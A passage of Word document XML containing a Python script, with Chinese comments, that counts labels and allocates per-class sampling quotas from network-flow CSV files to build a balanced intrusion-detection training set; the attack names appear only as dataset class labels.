          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>用法::</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB19094">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="596B8001">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    python3 tools/build_sample.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35F385F1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    python3 tools/build_sample.py --quota BENIGN=80000,"DoS Hulk"=30000 --out /tmp/small.csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4058E88C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E821526">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08F6E4E3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCF7885">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="337A6951">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="481E12B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C5DABC7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C98201">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from collections import Counter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFACD2B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from datetime import datetime, timezone</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37986DB7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4A07FF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C30652B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import numpy as np</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75750900">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import pandas as pd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35DFDB6C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BE058F3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 直接跑脚本时 sys.path[0] 是 tools/，仓库根不在路径上，手动补上才能共用标签映射</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EFB5373">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>sys.path.insert(0, str(Path(__file__).resolve().parent.parent))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF69E11">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from models.labels import CLASSES, LABEL_MAP, normalize_label  # noqa: E402</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D79067A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DBA9C27">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 目标总量约 25 万；稀有类自然全收</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2C54E1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>DEFAULT_QUOTA = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="089ECE8B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "BENIGN": 120_000,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B217231">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "DoS Hulk": 40_000,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A786BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "PortScan": 40_000,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758A1FE7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "DDoS": 40_000,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C365C91">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Patator": 13_835,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52854D9D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Heartbleed": 11,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39861A0A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46578A26">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AEC3442">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="694C4126">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def label_column(df):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="297A5D6E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for col in df.columns:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D8AE604">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if col.strip().lower() == "label":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="666CAF3B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return col</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C23BC1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    raise SystemExit(f"找不到 Label 列：{list(df.columns)[-3:]}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4B424D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F8A4E58">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E779374">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def count_by_file(files):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793A90DE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """第一遍只读 Label 列，拿到 (文件, 类) 的行数，用来给每个文件分配合适的配额。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ECA1CEB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    counts = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418E2F8B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for path in files:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C44B3B3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        df = pd.read_csv(path, usecols=lambda c: c.strip().lower() == "label", low_memory=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C0D17A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        mapped = df.iloc[:, 0].map(normalize_label).map(LABEL_MAP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293E34BB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        counts[path] = Counter(mapped.dropna().tolist())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5434BB14">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"[扫描] {path.name}: {dict(counts[path])}", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C4BF1E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return counts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DE07546">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0622C9E7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F093C88">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def allocate(counts, quota, classes):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B1C2F6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """把每类配额按"该类在各文件中的占比"分摊下去，用最大余数法保证分完不剩。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4750BEA9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    per_class_total = Counter()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35767CEA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for file_counts in counts.values():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CDE23A0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        per_class_total.update(file_counts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F0B5C30">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26EB2A61">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    alloc = {path: Counter() for path in counts}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D62D55F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for cls in classes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C5D1BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        total = per_class_total[cls]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA2D5B1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        target = min(quota[cls], total)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E101682">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if total == 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12AC90AF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C906C56">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
